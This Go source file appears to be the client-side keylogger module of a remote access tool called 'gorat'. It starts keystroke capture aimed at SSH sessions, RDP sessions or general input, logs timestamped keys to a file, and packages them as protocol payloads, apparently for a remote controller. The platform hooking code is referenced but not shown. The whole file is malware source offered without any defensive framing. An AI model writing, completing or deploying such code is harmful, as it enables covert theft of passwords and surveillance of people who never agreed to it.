package client

import (
	"fmt"
	"log"
	"os"
	"sync"
	"time"

	"gorat/pkg/protocol"
)

// Keylogger handles keyboard input monitoring
type Keylogger struct {
	running  bool
	target   string
	savePath string
	logFile  *os.File
	mu       sync.Mutex
	stopChan chan bool
	dataChan chan string
}

// NewKeylogger creates a new keylogger
func NewKeylogger() *Keylogger {
	return &Keylogger{
		stopChan: make(chan bool),
		dataChan: make(chan string, 100),
	}
}

// Start starts the keylogger
func (kl *Keylogger) Start(payload *protocol.KeyloggerPayload) error {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if kl.running {
		return fmt.Errorf("keylogger already running")
	}

	kl.target = payload.Target
	kl.savePath = payload.SavePath
	kl.running = true

	// Open log file
	if kl.savePath != "" {
		var err error
		kl.logFile, err = os.OpenFile(kl.savePath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
		if err != nil {
			kl.running = false
			return err
		}
	}

	// Start monitoring based on target
	switch kl.target {
	case "ssh":
		go kl.monitorSSH()
	case "rdp":
		go kl.monitorRDP()
	case "monitor", "general", "":
		go kl.monitorGeneral()
	default:
		kl.running = false
		if kl.logFile != nil {
			kl.logFile.Close()
		}
		return fmt.Errorf("unknown target: %s (use 'ssh', 'rdp', or 'monitor')", kl.target)
	}

	log.Printf("Keylogger started for target: %s", kl.target)
	return nil
}

// Stop stops the keylogger
func (kl *Keylogger) Stop() error {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if !kl.running {
		return fmt.Errorf("keylogger not running")
	}

	kl.running = false
	close(kl.stopChan)

	if kl.logFile != nil {
		kl.logFile.Close()
		kl.logFile = nil
	}

	log.Printf("Keylogger stopped")
	return nil
}

// IsRunning returns whether the keylogger is running
func (kl *Keylogger) IsRunning() bool {
	kl.mu.Lock()
	defer kl.mu.Unlock()
	return kl.running
}

// GetData returns captured keylogger data
func (kl *Keylogger) GetData() *protocol.KeyloggerDataPayload {
	select {
	case data := <-kl.dataChan:
		return &protocol.KeyloggerDataPayload{
			Target:    kl.target,
			Keys:      data,
			Timestamp: time.Now(),
		}
	default:
		return nil
	}
}

// logKeys logs keystrokes to file and channel
func (kl *Keylogger) logKeys(keys string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] %s\n", timestamp, keys)

	// Write to file
	if kl.logFile != nil {
		kl.logFile.WriteString(logEntry)
		kl.logFile.Sync()
	}

	// Send to channel
	select {
	case kl.dataChan <- keys:
	default:
		// Channel full, skip
	}
}

// Platform-specific functions are implemented in:
// - keylogger_windows.go: Windows implementation using SetWindowsHookEx
// - keylogger_linux.go: Linux/Unix implementation using /dev/input/eventX
//
// Each platform implements:
// - monitorSSH(): Monitor SSH sessions
// - monitorRDP(): Monitor RDP/remote sessions
// - monitorGeneral(): General keyboard monitoring
// - startPlatformMonitor(): Platform-specific initialization
